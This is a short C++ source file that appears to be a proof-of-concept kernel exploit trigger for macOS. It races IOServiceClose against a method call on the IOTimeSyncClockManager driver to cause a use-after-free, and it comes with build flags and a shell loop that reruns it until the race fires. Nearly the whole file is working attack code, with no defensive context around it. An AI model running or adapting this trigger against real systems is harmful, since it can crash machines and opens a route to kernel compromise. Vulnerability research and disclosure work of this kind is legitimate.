// ============================================================
// timesync_uaf.cpp — trigger UAF via clientClose race
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o timesync_uaf timesync_uaf.cpp \
//          -framework IOKit -lpthread
// Usage:   while true; do ./timesync_uaf; done
// ============================================================
#include <IOKit/IOKitLib.h>
#include <pthread.h>
#include <atomic>
#include <cstdio>

static std::atomic<int> go{0};

static void* closer(void* arg) {
    io_connect_t conn = static_cast<io_connect_t>(
        reinterpret_cast<uintptr_t>(arg));
    go.store(1);
    IOServiceClose(conn);
    return nullptr;
}

int main() {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOTimeSyncClockManager"));
    if (!svc) return 1;

    io_connect_t conn;
    if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS) return 1;

    pthread_t t;
    pthread_create(&t, nullptr, closer,
                   reinterpret_cast<void*>(static_cast<uintptr_t>(conn)));
    while (!go.load()) {}

    uint64_t out = 0;
    uint32_t outCnt = 1;
    kern_return_t kr = IOConnectCallScalarMethod(conn, 1, nullptr, 0, &out, &outCnt);
    std::printf("race: 0x%x\n", kr);
    return 0;
}
